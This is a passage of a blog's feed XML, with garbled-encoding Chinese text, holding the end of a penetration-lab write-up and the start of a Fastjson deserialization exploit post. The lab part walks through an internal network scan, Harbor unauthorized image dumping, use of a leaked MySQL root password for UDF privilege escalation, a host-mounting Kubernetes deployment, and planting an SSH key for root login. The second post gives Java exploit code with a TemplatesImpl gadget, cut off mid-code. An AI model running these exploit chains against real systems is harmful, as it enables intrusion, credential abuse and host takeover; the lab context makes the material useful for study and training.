errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">902</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span> </span><br><span class="line">          RX <span class="built_in">bytes</span>:<span class="number">38896</span> (<span class="number">38.8</span> KB)  TX <span class="built_in">bytes</span>:<span class="number">38816</span> (<span class="number">38.8</span> KB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  Mask:<span class="number">255.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">          inet6 addr: ::<span class="number">1</span>/<span class="number">128</span> Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:<span class="number">65536</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">379</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">379</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1</span> </span><br><span class="line">          RX <span class="built_in">bytes</span>:<span class="number">138851</span> (<span class="number">138.8</span> KB)  TX <span class="built_in">bytes</span>:<span class="number">138851</span> (<span class="number">138.8</span> KB)</span><br></pre></td></tr></table></figure><p>cd /tmp;./fs -h 172.22.14.1/24 -o result.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target <span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>     <span class="keyword">is</span> alive</span><br><span class="line">(icmp) Target <span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>    <span class="keyword">is</span> alive</span><br><span class="line">(icmp) Target <span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>    <span class="keyword">is</span> alive</span><br><span class="line">[*] Icmp alive hosts <span class="built_in">len</span> <span class="keyword">is</span>: <span class="number">3</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>:<span class="number">21</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>:<span class="number">80</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>:<span class="number">80</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">10250</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">2379</span> <span class="built_in">open</span></span><br><span class="line">[*] alive ports <span class="built_in">len</span> <span class="keyword">is</span>: <span class="number">8</span></span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle: http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>        code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">13693</span>  title:æ–°ç¿”OAç®¡ç†ç³»ç»Ÿ-OAç®¡ç†å¹³å°è”ç³»ç”µè¯ï¼š<span class="number">13849422648</span>å¾®ä¿¡åŒå·ï¼ŒQQ958756413</span><br><span class="line">[*] WebTitle: http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>       code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">785</span>    title:Harbor</span><br><span class="line">[+] InfoScan:http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>       [Harbor] </span><br><span class="line">[*] WebTitle: https://<span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">10250</span> code:<span class="number">404</span> <span class="built_in">len</span>:<span class="number">19</span>     title:<span class="literal">None</span></span><br><span class="line">[+] ftp://<span class="number">172.22</span><span class="number">.14</span><span class="number">.6</span>:<span class="number">21</span>:anonymous </span><br><span class="line">   [-&gt;]OASystem.<span class="built_in">zip</span></span><br><span class="line">[+] http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>/swagger.json poc-yaml-swagger-ui-unauth [&#123;path swagger.json&#125;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ä»£ç† 172.28.23.26:10001</p><h1>Harbor1</h1><p>CVE-2022-46463æœªæˆæƒè®¿é—®ï¼Œè¿›è¡Œé•œåƒæ‰«æ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">[+] search -&gt; <span class="number">0</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">1</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">2</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">3</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">4</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">5</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">6</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">7</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">8</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; <span class="number">9</span></span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; a</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; b</span><br><span class="line">[&#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; c</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; d</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; e</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; f</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; g</span><br><span class="line">[&#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; h</span><br><span class="line">[&#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; i</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; j</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; k</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; l</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; m</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; n</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; o</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; p</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; q</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; r</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; s</span><br><span class="line">[&#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; t</span><br><span class="line">[&#123;<span class="number">4</span>: <span class="string">&#x27;project/projectadmin&#x27;</span>&#125;, &#123;<span class="number">4</span>: <span class="string">&#x27;project/portal&#x27;</span>&#125;, &#123;<span class="number">3</span>: <span class="string">&#x27;harbor/secret&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; u</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; v</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; w</span><br><span class="line">[]</span><br><span class="line">[+] search -&gt; x</span><br><span class="line">[&#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; y</span><br><span class="line">[&#123;<span class="number">1</span>: <span class="string">&#x27;library/nginx&#x27;</span>&#125;, &#123;<span class="number">1</span>: <span class="string">&#x27;library/redis&#x27;</span>&#125;]</span><br><span class="line">[+] search -&gt; z</span><br><span class="line">[]</span><br><span class="line">Vulnerability URL, please verify</span><br><span class="line">http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>//harbor/projects/<span class="number">4</span>/repositories/projectadmin?publicAndNotLogged=yes</span><br><span class="line">http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>//harbor/projects/<span class="number">3</span>/repositories/secret?publicAndNotLogged=yes</span><br><span class="line">http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>//harbor/projects/<span class="number">1</span>/repositories/nginx?publicAndNotLogged=yes</span><br><span class="line">http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>//harbor/projects/<span class="number">4</span>/repositories/portal?publicAndNotLogged=yes</span><br><span class="line">http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>//harbor/projects/<span class="number">1</span>/repositories/redis?publicAndNotLogged=yes</span><br></pre></td></tr></table></figure><p>ä¸‹è½½secreté•œåƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python harbor.py http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>/ --dump harbor/secret --v2</span><br></pre></td></tr></table></figure><p><img src="assets/image-20240603213151-7ywln24.png" alt="image">â€‹</p><p>flag05: flag{8c89ccd3-029d-41c8-8b47-98fb2006f0cf}</p><h1>Harbor2</h1><p>ç»§ç»­ä¸‹è½½é•œåƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python harbor.py http://<span class="number">172.22</span><span class="number">.14</span><span class="number">.46</span>/ --dump project/projectadmin --v2</span><br></pre></td></tr></table></figure><p><img src="assets/image-20240603221215-ox4ns40.png" alt="image">â€‹</p><p>åœ¨å¦ä¸€ä¸ªæ–‡ä»¶å¤¹çš„run.shä¸­å‘ç°è¿è¡Œäº†è¯¥ç¨‹åºï¼Œåç¼–è¯‘ä¹‹åå‘ç°æ•°æ®åº“çš„è´¦å·å¯†ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.url=jdbc:mysql://<span class="number">172.22</span><span class="number">.10</span><span class="number">.28</span>:<span class="number">3306</span>/projectadmin?characterEncoding=utf-<span class="number">8</span>&amp;useUnicode=true&amp;serverTimezone=UTC</span><br><span class="line">spring.datasource.username=root</span><br><span class="line">spring.datasource.password=My3q1i4oZkJm3</span><br><span class="line">spring.datasource.driver-<span class="keyword">class</span>-name=com.mysql.cj.jdbc.Driver</span><br><span class="line"></span><br><span class="line">mybatis.<span class="built_in">type</span>-aliases-package=com.smartlink.projectadmin.entity</span><br><span class="line">mybatis.mapper-locations=classpath:mybatis/mapper/*.xml</span><br></pre></td></tr></table></figure><p>å°è¯•è¿æ¥ï¼Œè¿™é‡Œæ˜¯ç›´æ¥ç”¨åˆ°äº†è¿™é‡Œçš„urlå’Œç«¯å£ï¼Œæ•°æ®åº“æ»ç©ºï¼Œè´¦å·&amp;å¯†ç </p><p><img src="assets/image-20240603221621-guvbj3s.png" alt="image">â€‹</p><p>ç›´æ¥udfææƒ</p><p><img src="assets/image-20240603221627-z86vc34.png" alt="image">â€‹</p><p>flag06: flag{413ac6ad-1d50-47cb-9cf3-17354b751741}</p><h1>K8sæœªæˆæƒè®¿é—®</h1><p>è®¿é—®6443ç«¯å£ï¼Œå‘ç°å­˜åœ¨æœªæˆæƒ</p><p>ç¼–å†™ä¸€ä¸ªè„šæœ¬å¯åŠ¨å®¹å™¨</p><p>evil-deployment.yaml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-deployment</span><br><span class="line">  labels:</span><br><span class="line">    app: nginx</span><br><span class="line">spec:</span><br><span class="line">  replicas: <span class="number">1</span></span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: nginx</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: nginx</span><br><span class="line">        image: nginx:<span class="number">1.8</span></span><br><span class="line">        volumeMounts:</span><br><span class="line">        - mountPath: /mnt</span><br><span class="line">          name: test-volume</span><br><span class="line">      volumes:</span><br><span class="line">      - name: test-volume</span><br><span class="line">        hostPath:</span><br><span class="line">          path: /</span><br></pre></td></tr></table></figure><p>ç”±äºproxychainæ— æ³•ä»£ç†kubectlå®¢æˆ·ç«¯çš„æµé‡ï¼Œæ‰€ä»¥ä½¿ç”¨winå¼€å…¨å±€å–æ‰“</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe --insecure-skip-tls-verify -s https://<span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">6443</span>/  apply -f evil-deployment.yaml</span><br></pre></td></tr></table></figure><p>åˆ—å‡ºpodï¼ˆæ„Ÿè§‰åƒæ˜¯å¯åŠ¨çš„å®¹å™¨åˆ—è¡¨ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe --insecure-skip-tls-verify -s https://<span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">6443</span>/ get pods</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨idç™»å½•å®¹å™¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl.exe --insecure-skip-tls-verify -s https://<span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span>:<span class="number">6443</span>/ <span class="built_in">exec</span> -it nginx-deployment-864f8bfd6f-fktn5 /<span class="built_in">bin</span>/bash</span><br></pre></td></tr></table></figure><p>å› ä¸ºä¸Šé¢çš„å¯åŠ¨è„šæœ¬å·²ç»å°†å®¿ä¸»æœºçš„ç£ç›˜æŒ‚è½½åˆ°mntç›®å½•ä¸‹äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥åœ¨mntç›®å½•ä¸‹å¯¹å®¿ä¸»æœºçš„ç£ç›˜è¿›è¡Œæ“ä½œ</p><p>åˆ©ç”¨linuxæœºå™¨ç”Ÿæˆsshè¿æ¥å¯†é’¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b <span class="number">4096</span> </span><br></pre></td></tr></table></figure><p>é»˜è®¤è·¯å¾„/root/.ssh/id_rsaï¼Œå°†ç”Ÿæˆçš„id_rsa.pubå†™å…¥é¶æœºå¯¹åº”æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDjPlOojvCChYma6vh0Wgt0pV0cgnVWIc/sf6M/J1xsHfYxT+gkzc9sl3FEbcv6gSh5t6wCVbXip5kbLqFaBbICjb6ckb7JGnTpJvOXIzf2Le8b9huW2SRlmoWItZIMWfAsc/3lO/qNDSw0izGg7N5txsGYF03hpFrx9PDsx/IsVp1pG07LeYHWY/hNutSayfTU6doa4+qFKFTXoaZ6yQZAMCAaaj8M/gqmMl5NE+l0N6kH4lGgAoZ9oxlxcoL6h2AkrUmbCVnZzShzy9aH6/cel9Muct/wexsQq57mgE0ExEhMj7tuS6kP4dyrxpeycf5t8wY6y4/0tSpUB93zAqqVlw3GxX7VA4XofeNnJR+uu4xmDCkdN3hSy3+oXja6Q26vAzY/A00PADE4JQjdQyJzkuuJAv7u4iD0oXnqjiXJLqAWNn81Gh/VDjHy/hTUsmYPJNtjzOuYmNwYzBy/tpNIh61RYMVKm6JanahG8ViZckOn2gBaX4JhFcNcJsm457gfF5y/2lGaOhKt8PI3Fc9DZT5n134uarDx+HNznVWbig28DIzgki/eqxQU+0Ocw3iD+PrddwqeyBh/8F6xLYoew52gzqExaqkUOtgT0kmZol4JJCd5gQu0k0Ow0tnUpSCl1TXS/aCCL3u2eKQXf0TbKHsgjTKI5am9HuQEuBKHww== root@kali&quot;</span> &gt; authorized_keys</span><br></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨ç§é’¥sshè¿æ¥ç™»å½•å®¿ä¸»æœºï¼Œé™¤äº†å‘½ä»¤ä¹‹å¤–è¿˜å¯ä»¥ç”¨sshè½¯ä»¶å¯¼å…¥ç§é’¥ç™»å½•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh -i  /root/.ssh/id_rsa root@<span class="number">172.22</span><span class="number">.14</span><span class="number">.37</span></span><br></pre></td></tr></table></figure><p><img src="assets/image-20240603233216-no3pt3n.png" alt="image">â€‹</p><p>åœ¨æ•°æ®åº“ä¸­æ‹¿åˆ°flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tkYTY5YzQ1OS03ZmU1LTQ1MzUtYjhkMS0xNWZmZjQ5NmEyOWZ9Cg==</span><br></pre></td></tr></table></figure><p>flag04ï¼šflag{da69c459-7fe5-4535-b8d1-15fff496a29f}</p>]]></content>
    
    
    <summary type="html">æ•´ç†çš„ç¬”è®°</summary>
    
    
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/categories/%E6%B8%97%E9%80%8F/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="ç¬”è®°" scheme="https://bowuchuling.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="æ¸—é€" scheme="https://bowuchuling.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>FastjsonåŸç”Ÿååºåˆ—åŒ–</title>
    <link href="https://bowuchuling.github.io/posts/1997i0jz.html"/>
    <id>https://bowuchuling.github.io/posts/1997i0jz.html</id>
    <published>2024-04-19T14:34:33.847Z</published>
    <updated>2024-04-19T14:36:58.505Z</updated>
    
    <content type="html"><![CDATA[<h1>FastjsonåŸç”Ÿååºåˆ—åŒ–</h1><h2 id="fj1-1-2-48-fj2-2-0-26-ç›®å‰">fj1&lt;=1.2.48 &amp; fj2&lt;2.0.26(ç›®å‰)</h2><p>å…ˆç»™å‡ºEXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">ct</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\æ¼æ´å¤ç°\\fjyuansheng\\target\\classes\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] bytes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">ctDeclaredField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        ctDeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ctDeclaredField.set(templates,bytes);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Chu0&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> ct.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> 